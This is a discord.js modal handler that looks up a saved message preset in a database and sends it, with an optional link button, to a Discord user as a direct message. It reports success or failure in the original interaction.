const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const editpresetsmsg = require("../../../autosecure/utils/embeds/editpresetsmsg");
const { queryParams } = require("../../../db/database");

module.exports = {
  name: "presetexmodal",
  editpresets: true,
  callback: async (client, interaction) => {
    try {
      await interaction.deferUpdate();

      const presetName = interaction.fields.getTextInputValue("presetname");
      const [t, ownerid, botnumber, page] = interaction.customId.split("|");

   //   console.log(`Name: ${presetName}, ownerid: ${ownerid}, botnumber: ${botnumber}, page: ${page}`);

      let msg = await editpresetsmsg(botnumber, ownerid, page);

      // Note: user_id should match ownerid, and botnumber should be integer
      const botNumInt = parseInt(botnumber, 10);

      const preset = await queryParams(
        "SELECT * FROM presets WHERE user_id = ? AND name = ? AND botnumber = ? LIMIT 1",
        [ownerid, presetName, botNumInt],
        "get"
      );

      if (!preset) {
        msg.content = "❌ Preset not found";
        return await interaction.editReply(msg);
      }

      let user;
      try {
        user = await client.users.fetch(ownerid);
      } catch {
        msg.content = "❌ User not found";
        return await interaction.editReply(msg);
      }

      try {
        if (preset.preset) {
          const embed = new EmbedBuilder(JSON.parse(preset.preset));
          const responseOptions = { embeds: [embed] };

          if (preset.buttonlabel && preset.buttonlink) {
            const row = new ActionRowBuilder().addComponents(
              new ButtonBuilder()
                .setLabel(preset.buttonlabel)
                .setURL(preset.buttonlink)
                .setStyle(ButtonStyle.Link)
            );
            responseOptions.components = [row];
          }

          await user.send(responseOptions);
          msg.content = "✅ Preset sent successfully!";
        } else {
          msg.content = "❌ Preset has no message content";
        }
      } catch (error) {
        console.error("Failed to send DM:", error);
        msg.content = "❌ Failed to send preset. User may have DMs disabled.";
      }

      await interaction.editReply(msg);

    } catch (error) {
      console.error("Error in presetexmodal:", error);
      try {
        await interaction.editReply({
          content: "❌ An unexpected error occurred",
          components: []
        });
      } catch (editError) {
        console.error("Failed to edit reply:", editError);
      }
    }
  },
};
